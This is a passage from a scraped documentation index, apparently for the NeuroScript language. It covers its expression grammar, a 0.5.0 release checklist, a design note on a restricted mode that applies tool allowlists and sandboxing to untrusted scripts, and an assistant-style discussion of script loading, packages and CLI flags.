5 \u00b7 Expressions</p> <p>Expressions are defined with a specific operator precedence, from lowest to highest.</p> <pre><code>&lt;expression&gt; ::= &lt;logical_or_expr&gt; \n\n&lt;logical_or_expr&gt; ::= &lt;logical_and_expr&gt; { 'KW_OR' &lt;logical_and_expr&gt; } \n\n&lt;logical_and_expr&gt; ::= &lt;bitwise_or_expr&gt; { 'KW_AND' &lt;bitwise_or_expr&gt; } \n\n&lt;bitwise_or_expr&gt; ::= &lt;bitwise_xor_expr&gt; { 'PIPE' &lt;bitwise_xor_expr&gt; } \n\n&lt;bitwise_xor_expr&gt; ::= &lt;bitwise_and_expr&gt; { 'CARET' &lt;bitwise_and_expr&gt; } \n\n&lt;bitwise_and_expr&gt; ::= &lt;equality_expr&gt; { 'AMPERSAND' &lt;equality_expr&gt; } \n\n&lt;equality_expr&gt; ::= &lt;relational_expr&gt; { ( 'EQ' | 'NEQ' ) &lt;relational_expr&gt; } \n\n&lt;relational_expr&gt; ::= &lt;additive_expr&gt; { ( 'GT' | 'LT' | 'GTE' | 'LTE' ) &lt;additive_expr&gt; } \n\n&lt;additive_expr&gt; ::= &lt;multiplicative_expr&gt; { ( 'PLUS' | 'MINUS' ) &lt;multiplicative_expr&gt; } \n\n&lt;multiplicative_expr&gt; ::= &lt;unary_expr&gt; { ( 'STAR' | 'SLASH' | 'PERCENT' ) &lt;unary_expr&gt; } \n\n&lt;unary_expr&gt; ::= ( 'MINUS' | 'KW_NOT' | 'KW_NO' | 'KW_SOME' | 'TILDE' | 'KW_MUST' ) &lt;unary_expr&gt;\n               | 'KW_TYPEOF' &lt;unary_expr&gt;\n               | &lt;power_expr&gt; \n\n&lt;power_expr&gt; ::= &lt;accessor_expr&gt; [ 'STAR_STAR' &lt;power_expr&gt; ] \n\n&lt;accessor_expr&gt; ::= &lt;primary&gt; { 'LBRACK' &lt;expression&gt; 'RBRACK' } \n</code></pre> <p>### 5.1 Primary Expressions  Primary expressions are the atomic operands of the language.</p> <pre><code>&lt;primary&gt; ::= &lt;literal&gt;\n            | &lt;placeholder&gt;\n            | 'IDENTIFIER'\n            | 'KW_LAST'\n            | &lt;callable_expr&gt;\n            | 'KW_EVAL' 'LPAREN' &lt;expression&gt; 'RPAREN'\n            | 'LPAREN' &lt;expression&gt; 'RPAREN' \n\n&lt;callable_expr&gt; ::= ( &lt;call_target&gt; | 'KW_LN' | 'KW_LOG' | 'KW_SIN' | 'KW_COS' | 'KW_TAN' | 'KW_ASIN' | 'KW_ACOS' | 'KW_ATAN' | 'KW_LEN' ) \n                    'LPAREN' [ &lt;expression_list&gt; ] 'RPAREN' \n\n&lt;call_target&gt; ::= 'IDENTIFIER' | 'KW_TOOL' 'DOT' &lt;qualified_identifier&gt; \n\n&lt;qualified_identifier&gt; ::= 'IDENTIFIER' { 'DOT' 'IDENTIFIER' } \n\n&lt;placeholder&gt; ::= 'PLACEHOLDER_START' ( 'IDENTIFIER' | 'KW_LAST' ) 'PLACEHOLDER_END' \n</code></pre> <p>## 6 \u00b7 Literals &amp; Lists</p> <pre><code>&lt;literal&gt; ::= 'STRING_LIT'\n            | 'TRIPLE_BACKTICK_STRING'\n            | 'NUMBER_LIT'\n            | &lt;list_literal&gt;\n            | &lt;map_literal&gt;\n            | &lt;boolean_literal&gt;\n            | &lt;nil_literal&gt; \n\n&lt;nil_literal&gt; ::= 'KW_NIL' \n&lt;boolean_literal&gt; ::= 'KW_TRUE' | 'KW_FALSE' \n\n&lt;list_literal&gt; ::= 'LBRACK' [ &lt;expression_list&gt; ] 'RBRACK' \n&lt;expression_list&gt; ::= &lt;expression&gt; { 'COMMA' &lt;expression&gt; } \n\n&lt;map_literal&gt; ::= 'LBRACE' [ &lt;map_entry_list&gt; ] 'RBRACE' \n&lt;map_entry_list&gt; ::= &lt;map_entry&gt; { 'COMMA' &lt;map_entry&gt; } \n&lt;map_entry&gt; ::= 'STRING_LIT' 'COLON' &lt;expression&gt; \n</code></pre>"},{"location":"release_checklist.ndcl/","title":"NeuroScript 0.5.0 Release Checklist","text":""},{"location":"release_checklist.ndcl/#core-functionality-stability","title":"Core Functionality &amp; Stability","text":""},{"location":"release_checklist.ndcl/#interpreter","title":"Interpreter","text":"<ul> <li>[ ] Verify all language constructs (variables, control flow (<code>if</code>/<code>else</code>, <code>loop</code>), procedures, operators) work as documented (<code>docs/formal script spec.md</code>).</li> <li>[ ] Test error handling for syntax errors and runtime errors. Are error messages clear?</li> <li>[ ] Confirm evaluation logic (<code>pkg/core/evaluation_*.go</code>) is correct, especially for complex expressions and type handling.</li> <li>[ ] Test <code>last</code> keyword functionality (<code>library/TestLastKeyword.ns.txt</code>).</li> <li>[ ] Check list/map operations (<code>library/test_listmap.ns.txt</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#tools","title":"Tools","text":"<ul> <li>[ ] General: Test all registered tools (<code>pkg/core/tools_list_register.go</code>) for basic functionality and edge cases.</li> <li>[ ] <code>fs</code> tool: Verify read, write, list, delete operations (<code>pkg/core/tools_fs_*.go</code>). Pay special attention to path handling and permissions.</li> <li>[ ] <code>go_ast</code> tool: Confirm find and modify operations work correctly (<code>pkg/core/tools_go_ast_*.go</code>). Test with various Go code structures.</li> <li>[ ] <code>shell</code> tool: Thoroughly test execution (<code>pkg/core/tools_shell.go</code>) and ensure security implications are understood/mitigated (see Restricted Mode).</li> <li>[ ] <code>git</code> tool: Test basic git operations if included (<code>pkg/core/tools_git.go</code>).</li> <li>[ ] <code>llm</code> tool: Ensure interaction with the LLM API (<code>pkg/core/llm.go</code>, <code>llm_tools.go</code>) is functional and handles responses correctly.</li> <li>[ ] <code>nspatch</code> tool: Verify patching works as expected (<code>pkg/nspatch/nspatch.go</code>, <code>cmd/nspatch/nspatch.go</code>).</li> <li>[ ] NeuroData Tools: (<code>pkg/neurodata/*</code>): Ensure tools for specific data formats (checklist, blocks) are stable.</li> <li>[ ] Other Tools: Verify <code>io</code>, <code>math</code>, <code>string</code>, <code>vector</code>, etc. tools.</li> </ul>"},{"location":"release_checklist.ndcl/#restricted-mode","title":"Restricted Mode","text":"<ul> <li>[ ] Thoroughly test restricted mode (<code>pkg/core/security*.go</code>, <code>docs/restricted_mode.md</code>).</li> <li>[ ] Confirm tool restrictions (especially <code>fs</code>, <code>shell</code>, <code>git</code>) are enforced correctly.</li> <li>[ ] Validate allowlist mechanisms (<code>cmd/neurogo/agent_allowlist.txt</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#build-distribution","title":"Build &amp; Distribution","text":""},{"location":"release_checklist.ndcl/#build-process","title":"Build Process","text":"<ul> <li>[ ] Document clear build instructions (<code>docs/build.md</code> seems to exist, ensure it's up-to-date).</li> <li>[ ] Ensure the project builds cleanly (<code>go build ./...</code>).</li> <li>[ ] Test cross-compilation if supporting multiple OS/architectures.</li> </ul>"},{"location":"release_checklist.ndcl/#dependencies","title":"Dependencies","text":"<ul> <li>[ ] Check <code>go.mod</code> and <code>go.sum</code> are up-to-date and committed.</li> <li>[ ] Minimize external dependencies where possible.</li> </ul>"},{"location":"release_checklist.ndcl/#packaging","title":"Packaging","text":"<ul> <li>[ ] Decide on distribution format (e.g., source code release on GitHub, pre-compiled binaries).</li> <li>[ ] Create release artifacts (e.g., zip/tarball of source, binaries).</li> </ul>"},{"location":"release_checklist.ndcl/#tagging","title":"Tagging","text":"<ul> <li>[ ] Tag the release commit in Git (e.g., <code>v0.1.0</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#documentation","title":"Documentation","text":""},{"location":"release_checklist.ndcl/#readme-readmemd","title":"README (<code>README.md</code>)","text":"<ul> <li>[ ] Clear project description and purpose.</li> <li>[ ] Quick start guide (installation, simple example).</li> <li>[ ] Link to more detailed documentation.</li> <li>[ ] Installation instructions.</li> <li>[ ] Basic usage examples for <code>neurogo</code> CLI.</li> </ul>"},{"location":"release_checklist.ndcl/#language-specification-docsformal-script-specmd","title":"Language Specification (<code>docs/formal script spec.md</code>)","text":"<ul> <li>[ ] Ensure it accurately reflects the current language implementation.</li> <li>[ ] Cover syntax, data types, operators, control flow, procedures, built-in tools.</li> </ul>"},{"location":"release_checklist.ndcl/#tool-documentation-docsnstools","title":"Tool Documentation (<code>docs/ns/tools/*</code>?)","text":"<ul> <li>[ ] Document all available tools, their parameters, return values, and examples. (Consider generating this automatically if possible).</li> <li>[ ] Clearly state potential side effects or security considerations (e.g., <code>shell</code>, <code>fs.write</code>, <code>fs.delete</code>).</li> </ul>"},{"location":"release_checklist.ndcl/#neurodata-formats-docsneurodata-docsneurodata_and_composite_file_specmd","title":"NeuroData Formats (<code>docs/NeuroData/*</code>, <code>docs/neurodata_and_composite_file_spec.md</code>)","text":"<ul> <li>[ ] Clearly document the specifications for checklist (<code>.ndcl</code>), patch (<code>.ndpatch</code>), blocks (<code>.ndblk</code>), and any other custom formats.</li> </ul>"},{"location":"release_checklist.ndcl/#examples-libraryexamples-other-nstxt-files","title":"Examples (<code>library/examples/*</code>, other <code>.ns.txt</code> files)","text":"<ul> <li>[ ] Provide clear, working examples demonstrating key features and common use cases.</li> <li>[ ] Ensure examples run correctly with the release version.</li> </ul>"},{"location":"release_checklist.ndcl/#agentllm-features-docsllm_agent_facilitiesmd","title":"Agent/LLM Features (<code>docs/llm_agent_facilities.md</code>)","text":"<ul> <li>[ ] Explain how to use NeuroScript with LLMs, including tool integration.</li> </ul>"},{"location":"release_checklist.ndcl/#roadmap-docsroadmapmd","title":"Roadmap (<code>docs/RoadMap.md</code>)","text":"<ul> <li>[ ] Update with completed items and future plans (optional but helpful).</li> </ul>"},{"location":"release_checklist.ndcl/#contribution-guide","title":"Contribution Guide","text":"<ul> <li>[ ] Basic instructions on how others can contribute (bug reports, features) (Optional, but good for future).</li> </ul>"},{"location":"release_checklist.ndcl/#testing","title":"Testing","text":""},{"location":"release_checklist.ndcl/#unit-tests-pkg_testgo","title":"Unit Tests (<code>pkg/.../*_test.go</code>)","text":"<ul> <li>[ ] Ensure all existing tests pass (<code>go test ./...</code>).</li> <li>[ ] Review test coverage. Add tests for any critical, untested areas.</li> <li>[ ] Test edge cases and error conditions.</li> </ul>"},{"location":"release_checklist.ndcl/#integration-tests","title":"Integration Tests","text":"<ul> <li>[ ] Test scripts that use multiple tools together (<code>library/*.ns.txt</code> files likely serve this purpose).</li> <li>[ ] Test <code>neurogo</code> command-line execution with various flags and scripts.</li> </ul>"},{"location":"release_checklist.ndcl/#example-tests","title":"Example Tests","text":"<ul> <li>[ ] Manually run or automate the execution of all provided examples to ensure they work.</li> </ul>"},{"location":"release_checklist.ndcl/#usability-dx-developer-experience","title":"Usability &amp; DX (Developer Experience)","text":""},{"location":"release_checklist.ndcl/#command-line-interface-cmdneurogomaingo","title":"Command Line Interface (<code>cmd/neurogo/main.go</code>)","text":"<ul> <li>[ ] Test command-line arguments (flags for script execution, agent mode, restricted mode, config).</li> <li>[ ] Ensure help messages (<code>-h</code>, <code>--help</code>) are informative.</li> <li>[ ] Provide useful output/logging during script execution.</li> </ul>"},{"location":"release_checklist.ndcl/#configuration-pkgneurogoconfiggo","title":"Configuration (<code>pkg/neurogo/config.go</code>)","text":"<ul> <li>[ ] Verify configuration loading (e.g., API keys for LLM) works correctly.</li> <li>[ ] Document configuration options.</li> </ul>"},{"location":"release_checklist.ndcl/#error-messages","title":"Error Messages","text":"<ul> <li>[ ] Review error messages across the interpreter and tools for clarity and helpfulness.</li> </ul>"},{"location":"release_checklist.ndcl/#legal-administrative","title":"Legal &amp; Administrative","text":""},{"location":"release_checklist.ndcl/#license","title":"License","text":"<ul> <li>[ ] Ensure the MIT license file (<code>LICENSE</code>) is present in the root directory.</li> <li>[ ] Ensure source files have appropriate license headers (if desired).</li> </ul>"},{"location":"release_checklist.ndcl/#repository","title":"Repository","text":"<ul> <li>[ ] Clean up unnecessary files or branches.</li> <li>[ ] Ensure the default branch (e.g., <code>main</code> or <code>master</code>) is stable.</li> </ul>"},{"location":"release_checklist.ndcl/#publicity-post-release","title":"Publicity (Post-Release)","text":""},{"location":"release_checklist.ndcl/#github-release","title":"GitHub Release","text":"<ul> <li>[ ] Create a release on GitHub with the tag, including release notes summarizing changes.</li> </ul>"},{"location":"release_checklist.ndcl/#announcement","title":"Announcement","text":"<ul> <li>[ ] Plan how/where to announce the release (e.g., blog post, social media, relevant forums).</li> </ul>"},{"location":"restricted_mode/","title":"Restricted Mode","text":"<p>Thinking Process:</p> <p>Goal: Implement the ability to execute a NeuroScript procedure (CALL ProcedureName(...)) but apply the tool restrictions (allowlist/denylist) that would normally apply to an LLM agent calling TOOL.FunctionName(...). User Request Analysis: User wants to run a script (potentially generated by an LLM). This script should be executed with limited tool access, specifically using the same restrictions defined for the LLM agent mode (allowlist/denylist). This acts as a safety mechanism for running potentially untrusted scripts. Current State: The interpreter (pkg/core/interpreter.go) executes CALL TOOL. directly using the registered tools. The agent mode (pkg/neurogo/app_agent.go) uses a SecurityLayer (pkg/core/security.go) to validate TOOL. calls originating from the LLM before execution. This layer checks denylists, allowlists, and performs argument validation. Proposed Solution - Conceptual: Introduce a new execution mode or flag within the interpreter itself that signals \"restricted execution.\" When the interpreter encounters a CALL TOOL. step and this restricted mode is active, it should route the call through a validation layer before executing the tool function. This validation layer should use the same logic/configuration (allowlist/denylist) as the agent's SecurityLayer. Implementation Options: Option A: Modify Interpreter.executeCall: Add a flag to the Interpreter struct, e.g., restrictedToolMode bool. Add fields for the allowlist/denylist (similar to SecurityLayer). These would need to be loaded based on configuration passed to the interpreter. In executeCall, when strings.HasPrefix(target, \"TOOL.\") is true and restrictedToolMode is true: Perform allowlist/denylist checks before getting the toolImpl. Crucially, how to handle argument validation? executeCall gets evaluatedArgs as []interface{}, while SecurityLayer.ValidateToolCall expects map[string]interface{} (like the LLM FunctionCall). This mismatch is problematic. We'd need to reconstruct the arg map from the toolImpl.Spec and the ordered evaluatedArgs before passing to a validation function similar to SecurityLayer.validateArgumentsAgainstSpec. This adds complexity. If validation passes, execute toolImpl.Func. If restrictedToolMode is false, execute normally. Option B: Introduce a \"Restricted Caller Context\": Modify the ToolFunc signature slightly or pass context differently. Maybe ToolFunc func(interpreter Interpreter, args []interface{}, callCtx ToolCallContext) (interface{}, error). ToolCallContext could include info like IsRestricted bool. Inside ToolFunc implementations (e.g., toolReadFile, toolExecuteCommand), check callCtx.IsRestricted. If true, apply stricter internal checks (e.g., always deny toolExecuteCommand, enforce stricter path validation). This distributes the checks into each tool, which might be less maintainable and harder to configure centrally via allow/deny lists. Argument validation still needs handling before the call. Option C: Introduce a New High-Level \"Run Restricted\" Function: Create a new function like Interpreter.RunProcedureRestricted(procName string, allowlist []string, denylist map[string]bool, sandboxRoot string, args ...string). This function would create/configure a temporary SecurityLayer (or similar validation logic) specifically for this execution. It would then call the regular RunProcedure. The core challenge remains: how does the inner executeCall know it needs to apply restrictions? It needs context passed down. Option D: New Interpreter Execution Mode: Similar to Option A, add a mode flag (restrictedToolMode) and configuration (allow/deny lists, sandbox root) to the Interpreter. When restrictedToolMode is set: In executeCall for TOOL.* calls: Look up the ToolSpec. Check allow/deny lists. Argument Validation: Convert the positional evaluatedArgs []interface{} into a map[string]interface{} using the ToolSpec.Args names. This is the key step. Call a validation function (like SecurityLayer.ValidateToolCall, potentially refactored to be reusable or copied) using the constructed arg map, allow/deny lists, and sandbox root. This validator performs type checks, sandbox checks, etc. If validation fails, return an error to the script. If validation passes, execute the toolImpl.Func with the original (but validated types) convertedArgs []interface{}. Note: the validation function might return validated/coerced values, but the tool func still expects []interface{}. Ensure consistency. Refinement - Option D: This seems the most robust. It keeps the validation logic centralized (reusing or adapting the SecurityLayer's logic) and modifies the core executeCall based on an interpreter mode. The main work is mapping positional args to named args for validation and then ensuring the validated args are passed correctly. Detailed Plan (Option D):</p> <p>Modify Interpreter Struct (pkg/core/interpreter.go): Add fields: isRestrictedMode bool restrictedAllowlist map[string]bool restrictedDenylist map[string]bool restrictedSandboxRoot string Modify NewInterpreter (or add a new setup function): Allow setting the restriction mode and related configuration when the interpreter is created or configured. Modify Interpreter.executeCall (pkg/core/interpreter_simple_steps.go): Inside the if strings.HasPrefix(target, \"TOOL.\") block: Add a check: if i.isRestrictedMode { ... }. Inside the if i.isRestrictedMode block: Look up toolImpl and toolSpec as currently done. Handle tool not found. Check Denylist: if i.restrictedDenylist[toolName] { return nil, fmt.Errorf(\"tool '%s' denied in restricted mode\", toolName) }. Check Allowlist: if !i.restrictedAllowlist[toolName] { return nil, fmt.Errorf(\"tool '%s' not allowed in restricted mode\", toolName) }. Check High-Risk (e.g., ExecuteCommand): Add specific checks if needed (redundant if denylisted). if toolName == \"TOOL.ExecuteCommand\" { return nil, ... }. Prepare Args for Validation: Create rawArgsMap := make(map[string]interface{}). Iterate through toolSpec.Args and evaluatedArgs. If idx &lt; len(evaluatedArgs), map toolSpec.Args[idx].Name to evaluatedArgs[idx]. Validate Arguments: Call a validation function. This could be a refactored version of SecurityLayer.validateArgumentsAgainstSpec that takes the interpreter's restriction config. Let's call it validateRestrictedArgs(toolSpec, rawArgsMap, i.restrictedSandboxRoot). This function performs type checks, sandbox checks (using SecureFilePath with i.restrictedSandboxRoot), etc. It should return the validated map (or potentially just an error). Handle Validation Error: If validateRestrictedArgs returns an error, propagate it wrapped in context (e.g., fmt.Errorf(\"restricted tool call validation failed for '%s': %w\", toolName, validationErr)). Proceed to Execution (if validation passed): The arguments passed to toolImpl.Func should still be the original evaluatedArgs []interface{} slice, because ValidateAndConvertArgs is not called here in the same way as the LLM agent path. The validateRestrictedArgs step primarily serves as a check rather than a conversion pass in this context (though it must perform type checks). We rely on the initial evaluateExpression having produced compatible types. Call callResultValue, callErr = toolImpl.Func(i, evaluatedArgs). Store i.lastCallResult = callResultValue if callErr == nil. Handle callErr. Outside the if i.isRestrictedMode block (i.e., else): Execute the tool directly as it's currently done (find tool, call ValidateAndConvertArgs, call Func). Refactor Validation Logic (from pkg/core/security_validation.go): Create a new function validateRestrictedArgs (or similar) that takes ToolSpec, map[string]interface{}, and sandboxRoot. This function should reuse the core logic from validateArgumentsAgainstSpec (type checking, sandbox checking using SecureFilePath) but doesn't need to return a modified map if the goal is just validation. It just needs to return an error if any check fails. It primarily ensures arguments conform to the spec and stay within the sandbox. Update neurogo CLI (pkg/neurogo/app.go, config.go, app_script.go): Add a new flag (e.g., -restricted) to config.go and ParseFlags. When running in script mode (app_script.go), if the -restricted flag is set: Load the allowlist/denylist files specified by the agent flags (-allowlist, -denylist). Load the sandbox root (-sandbox). Configure the created Interpreter instance with isRestrictedMode = true and the loaded lists/root. Testing: Add tests for Interpreter.RunProcedure where isRestrictedMode is true. Test cases should include: Calling an allowed tool (e.g., StringLength). Calling a denied tool (e.g., ExecuteCommand if denylisted). Calling a non-allowlisted tool. Calling a file tool (ReadFile) with a path inside the sandbox. Calling a file tool (ReadFile) with a path outside the sandbox (should fail validation). Calling a tool with incorrect argument types (should fail validation). Self-Check:</p> <p>Does the plan address the user's request? Yes. Does it leverage existing components (Interpreter, SecurityLayer logic)? Yes. Does it handle the argument type mismatch (slice vs map)? Yes, by reconstructing the map for validation. Is it reasonably secure? Yes, by applying allow/deny lists and sandbox checks. Does it require Go code changes? Yes, in Interpreter, execution logic, validation logic, and CLI handling. Does it require NeuroScript changes? No. Confidence Score: 4/5 (Complexity in correctly mapping/validating args and integrating the mode requires careful implementation).</p> <p>Action: Generate the Go code modifications based on Option D. Provide updated interpreter.go, interpreter_simple_steps.go, a new security_restricted_validation.go (or similar for the refactored validation), config.go, and app_script.go.</p>"},{"location":"script_loading_disc/","title":"Script loading disc","text":"<p>Any thoughts? :) I have ideas, but I feel cryptic. </p> <p>Newer than below, refined:</p> <p>Got it \u2014 here\u2019s how the revised plan shakes out, step by step.</p>"},{"location":"script_loading_disc/#1-load-only-semantics-no-implicit-main","title":"1  Load-only semantics (no implicit <code>main</code>)","text":"<ul> <li>Loader rule:   Parse \u2192 Register only.   No evaluation happens unless some caller explicitly does:</li> </ul> <pre><code>if err := interp.Call(\"startup.init\", args); \u2026\n</code></pre> <ul> <li>Impact on existing code \u2013 zero.   Any script that was relying on \u201c<code>main</code> auto-runs\u201d just adds one line to its shell wrapper or to <code>startup.ns</code>.</li> </ul>"},{"location":"script_loading_disc/#2-packages-instead-of-modules","title":"2  Packages instead of modules","text":"Item Spec Metadata key <code>:: package: &lt;name&gt;</code> Separator <code>.</code> (same as Go\u2019s selector) Export rule every global symbol becomes <code>pkgName.origName</code> at registration time Internal calls unchanged (<code>validate()</code>) \u2013 the loader only rewrites the export table <p>Example</p> <pre><code>:: package: auth\n\nfunc login(u, p) means \u2026 endfunc     # exported as auth.login\nfunc validate() means \u2026 endfunc       # exported as auth.validate\n</code></pre> <p>Now any other script (or the CLI) can do: <code>call auth.login(...)</code>.</p>"},{"location":"script_loading_disc/#3-cli-contract-script-entrypoint-str_args","title":"3  CLI contract (<code>-script</code>, <code>-entrypoint</code>, <code>-str_args</code>)","text":""},{"location":"script_loading_disc/#single-task-form","title":"Single-task form","text":"<pre><code>zadeh \\\n  -script        scripts/startup.ns \\\n  -entrypoint    startup.init \\\n  -str_args      \"FDM Home Zadeh Server\"\n</code></pre>"},{"location":"script_loading_disc/#multi-task-form","title":"Multi-task form","text":"<pre><code>zadeh \\\n  -script_boot     scripts/boot.ns  -str_args_boot     \"\u2026\" \\\n  -script_ingest   scripts/ingest.ns -entrypoint_ingest ingest.run \\\n  -script_api      scripts/api.ns\n</code></pre> <p>Parsing sketch</p> <pre><code>var (\n    scriptFlags     = fl.String(\"script\", \"\", \"path to script\")\n    entrypointFlags = fl.String(\"entrypoint\", \"\", \"func to call after load\")\n    strArgsFlags    = fl.String(\"str_args\", \"\", \"comma-sep args\")\n    // Capture _taskN variants with flag.Func + regex if you want dynamism.\n)\nfl.Parse()\n\ncfgs := collectScriptConfigs(flag.CommandLine)  // \u2192 []ScriptJob\nfor _, job := range cfgs {\n    if err := loader.Load(job.Path); err != nil { \u2026 }\n    if job.Entry != \"\" {\n        args := strings.Split(job.Args, \",\")\n        if err := interp.Call(job.Entry, args); err != nil { \u2026 }\n    }\n}\n</code></pre>"},{"location":"script_loading_disc/#why-comma-separated-strings","title":"Why comma-separated strings?","text":"<ul> <li>Keeps everything POSIX-safe (no nested quoting hell).</li> <li>You already plan plain-string args only; if you later need structured values, add <code>-json_args_task1</code>.</li> </ul>"},{"location":"script_loading_disc/#4-loader-changes-in-detail","title":"4  Loader changes in detail","text":"<pre><code>// loader/loader.go\nfunc (ld *Loader) Load(path string) error {\n    src, err := os.ReadFile(path)\n    if err != nil { return err }\n\n    mod, err := ld.parser.Parse(src)\n    if err != nil { return err }\n\n    pkg := mod.Metadata[\"package\"]      // \"\" allowed for legacy\n    for _, fn := range mod.Functions {\n        exportName := fn.Name\n        if pkg != \"\" {\n            exportName = pkg + \".\" + fn.Name\n        }\n        if err := ld.interp.RegisterFunc(exportName, fn); err != nil {\n            return err\n        }\n    }\n    // No auto-call here.\n    return nil\n}\n</code></pre> <p>Unit-test the no-auto-exec guarantee by loading a script whose <code>init()</code> sets a global flag; assert the flag is still false.</p>"},{"location":"script_loading_disc/#5-chaining-scripts-inside-a-script","title":"5  Chaining scripts inside a script","text":"<p>Because nothing auto-execs, chaining is now pure, explicit code:</p> <pre><code>call tool.Script.Load(\"infra/db.ns\")\ncall tool.Script.Load(\"services/cache.ns\")\n\ncall infra.db.init()\ncall services.cache.warm()\n</code></pre> <p>(If you expose <code>tool.Script.Load</code> the same way we sketched earlier, the above stays a one-liner per script.)</p>"},{"location":"script_loading_disc/#6-edge-case-checklist","title":"6  Edge-case checklist","text":"Scenario Behaviour Two packages export the same symbol (<code>auth.login</code> &amp; <code>auth.login</code>) second load returns <code>ErrDuplicateSymbol</code> \u2013 easy to spot Script omitted <code>:: package:</code> its public names are unqualified (legacy style) CLI omits <code>-entrypoint</code> script is loaded, nothing executed \u2013 matches rule #1 Comma appears inside an arg user must quote/escape per POSIX, or use future <code>-json_args</code>"},{"location":"script_loading_disc/#next-actions","title":"Next actions","text":"<ol> <li>Rename <code>module</code> \u2192 <code>package</code> in the loader branch.</li> <li>Wire up the CLI parser with the \u201cN-task\u201d convention.</li> <li>Add tests for load-only and for package collisions.</li> <li>Update any doc snippets (<code>README</code>, examples/) to remove all \u201cauto-run <code>main</code>\u201d language.</li> </ol> <p>Ping me if you want help with the <code>collectScriptConfigs</code> helper or any flag-parsing quirks. Happy hacking!</p>"},{"location":"script_loading_disc/#no-package-no-exports-what-it-buys-you-and-the-two-minute-wiring-plan","title":"\u201cNo <code>package</code>, no exports\u201d \u2014 what it buys you and the two-minute wiring plan","text":"<p>You\u2019re basically saying: \u201cOnly code that opts-in via <code>:: package:</code> is part of the shared symbol space; everything else stays private.\u201d That\u2019s a clean rule and it discourages accidental bleed-over. Here\u2019s a minimal way to pull it off without re-architecting the interpreter.</p>"},{"location":"script_loading_disc/#1-revised-loader-rule-set","title":"1\u2003Revised loader rule set","text":"Case What the loader does Public symbol table How the CLI can still call it <code>:: package: auth</code> present Prefix every global with <code>auth.</code> Yes (<code>auth.login</code>, <code>auth.validate</code> \u2026) <code>-entrypoint auth.init</code> No <code>package</code> line Register symbols only in the per-script table; do not copy to global map None Loader remembers the script handle and can call <code>init</code> directly <p>Why keep a per-script table anyway?</p> <ul> <li>So the CLI can still run its entrypoint.</li> <li>So a script can unit-test itself (<code>call init()</code> locally) even when \u201cprivate\u201d.</li> </ul>"},{"location":"script_loading_disc/#2-tiny-implementation-sketch","title":"2\u2003Tiny implementation sketch","text":"<pre><code>// loader.Load returns a handle so callers can invoke privates.\nfunc (ld *Loader) Load(path string) (*core.ScriptHandle, error) {\n    mod := parseFile(path)\n    handle := core.NewScriptHandle(mod)      // owns its own symbol map\n\n    pkg, _ := mod.Metadata[\"package\"]\n    for _, fn := range mod.Functions {\n        handle.RegisterLocal(fn.Name, fn)\n\n        if pkg != \"\" {                       // export only if package is set\n            public := pkg + \".\" + fn.Name\n            if err := ld.interp.RegisterFunc(public, fn); err != nil {\n                return nil, err\n            }\n        }\n    }\n    return handle, nil\n}\n</code></pre> <p>The <code>ScriptHandle</code> just wraps a <code>map[string]*Function</code> plus an <code>Invoke(name, args)</code> helper that bypasses the global table.</p>"},{"location":"script_loading_disc/#3-cli-path-with-without-packages","title":"3\u2003CLI path with &amp; without packages","text":"<pre><code>h, _ := loader.Load(flagScript)\n\nif ep := *entrypointFlag; ep != \"\" {\n    if strings.Contains(ep, \".\") {          // pkg-qualified =&gt; public call\n        interp.Call(ep, args)\n    } else {                                // unqualified =&gt; private call\n        h.Invoke(ep, args)\n    }\n}\n</code></pre> <p>So:</p> <pre><code># Private startup script\nzadeh -script startup.ns -entrypoint init -str_args \"Hello\"\n# Shared auth package\nzadeh -script auth.ns    -entrypoint auth.migrate_db\n</code></pre>"},{"location":"script_loading_disc/#4-practical-upsides","title":"4\u2003Practical upsides","text":"<ol> <li>Zero namespace pollution \u2014 unless the author explicitly wants it.</li> <li>Clear intent \u2014 reviewers see <code>:: package:</code> and know the file is a library.</li> <li>Safe refactors \u2014 you can rename <code>validate()</code> inside a private script without hunting cross-file references.</li> </ol>"},{"location":"script_loading_disc/#5-potential-gotchas-and-easy-fixes","title":"5\u2003Potential gotchas (and easy fixes)","text":"Gotcha Mitigation A script expects to be called by another script but forgets <code>:: package:</code> Loader can warn: \u201c<code>tool.Script.Load</code> on non-packaged script provides no exports \u2014 did you mean to add <code>:: package:</code>?\u201d Someone tries <code>call otherScript.init()</code> where <code>otherScript</code> wasn\u2019t packaged Interpreter raises <code>NameError</code>. Multiple private scripts both define <code>init()</code> and the CLI wants to run both You already disambiguate with separate <code>-script_taskN</code> flags; their names stay local."},{"location":"script_loading_disc/#6-optional-nicety-export-whitelist","title":"6\u2003Optional nicety: <code>:: export:</code> whitelist","text":"<p>If you later want \u201cmostly private but share two funcs,\u201d add:</p> <pre><code>:: export: init, health_check\n</code></pre> <p>Loader rule: export only those, still prefixed if <code>:: package:</code> exists.</p>"},{"location":"script_loading_disc/#tldr","title":"TL;DR","text":"<ul> <li>Accept the refinement: No <code>package</code> line \u21d2 nothing exported.</li> <li>Keep each script\u2019s symbols in its own <code>ScriptHandle</code>; the CLI (or tests) can still invoke privates directly.</li> <li>External sharing now requires an explicit <code>:: package:</code> \u2014 enforcing discipline without extra ceremony.</li> </ul> <p>Plug this into the current loader and you\u2019ve achieved encapsulation with \\~30 lines of Go. Ping me if you want sample tests or flag-parsing helpers.</p> <p>Absolutely \u2014 default-private scripts with opt-in <code>package</code> exports are a net win:</p> <ul> <li>Safety first \u2013 nothing leaks into the global namespace unless the author wants it. That eliminates \u201coops, I over-wrote <code>util.hash</code> again\u201d class bugs.</li> <li>Clear intent \u2013 reviewers can skim for <code>:: package:</code> to spot true libraries; everything else is implementation detail.</li> <li>Refactor freedom \u2013 private scripts can rename, split, or delete functions without grep-and-pray across the repo.</li> <li>Go-style ergonomics \u2013 mirrors the \u201cinternal\u201d convention and the way unexported (lower-case) Go identifiers stay local.</li> <li>Future features \u2013 later you can layer <code>:: export:</code> whitelists or visibility levels without breaking today\u2019s code.</li> </ul> <p>Trade-off is minimal:</p> <ul> <li>The very first time a dev forgets to add <code>:: package:</code> they\u2019ll hit a \u201cfunction not found\u201d at load time\u2014loud and quick to fix.</li> <li>Tests that previously relied on <code>main</code> auto-running need a one-liner update (<code>handle.Invoke(\"init\")</code>), but that\u2019s a one-time chore.</li> </ul> <p>So yes, it tightens the system\u2019s design contract and scales better as the codebase grows\u2014definitely another Good Thing\u2122.</p> <p>o3: Here are a few patterns we\u2019ve used in other long-running interpreters that map cleanly onto the current NeuroScript grammar and runtime without breaking 